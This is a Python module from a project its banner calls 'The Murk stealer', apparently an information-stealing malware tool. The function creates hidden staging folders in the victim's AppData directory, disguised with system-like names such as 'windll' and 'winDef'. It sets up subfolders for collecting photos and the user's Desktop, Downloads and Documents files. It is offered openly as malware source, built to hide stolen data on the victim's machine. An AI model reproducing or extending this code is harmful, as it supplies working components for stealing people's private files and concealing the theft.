#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
"""
All imports
"""
import os
from win32con import FILE_ATTRIBUTE_HIDDEN
from win32api import SetFileAttributes


"""
Makes all needed directories
"""
def makeFolders(fileGrab):
    pathf = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
    if os.path.exists(rf'{pathf}\windll'):
        print('none')
    else:
        os.makedirs(rf'{pathf}\system\sysFiles\winDef')
        open(rf'{pathf}\system\sysFiles\winDef\log20742384.txt', 'w', encoding='utf-8')
        os.makedirs(rf'{pathf}\windll\System')
        SetFileAttributes(rf'{pathf}\windll', FILE_ATTRIBUTE_HIDDEN)
        os.makedirs(rf'{pathf}\windll\Photos')
        if not fileGrab:
            os.makedirs(rf'{pathf}\windll\DocumentFiles\Desktop')
            os.makedirs(rf'{pathf}\windll\DocumentFiles\Downloads')
            os.makedirs(rf'{pathf}\windll\DocumentFiles\Documents')

